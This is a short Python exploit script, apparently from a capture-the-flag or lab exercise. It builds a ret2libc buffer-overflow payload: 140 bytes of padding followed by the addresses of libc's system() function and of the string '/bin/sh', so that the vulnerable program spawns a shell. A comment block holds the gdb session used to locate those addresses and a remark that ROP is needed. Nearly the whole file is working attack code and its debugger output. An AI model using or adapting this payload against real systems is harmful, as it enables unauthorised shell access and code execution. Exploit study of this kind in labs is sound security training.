import struct

junk = "A" * 140
systemaddr = struct.pack('I', 0xf7e51940)
ret = struct.pack('I', 0xdeadbeef)
binaddr = struct.pack('I', 0xf7f7002b)



print junk + systemaddr + ret + binaddr

'''
(gdb) print system
$1 = {<text variable, no debug info>} 0xf7e51940 <system>
(gdb) print __libc_start_main
$2 = {<text variable, no debug info>} 0xf7e2f540 <__libc_start_main>
(gdb) find 0xf7e2f540, +2200000, "/bin/sh"
0xf7f7002b
warning: Unable to access 16000 bytes of target memory at 0xf7fc9db3, halting search.
1 pattern found.
(gdb) x/s 0xf7f7002b
0xf7f7002b: "/bin/sh"

so we need ROP
'''

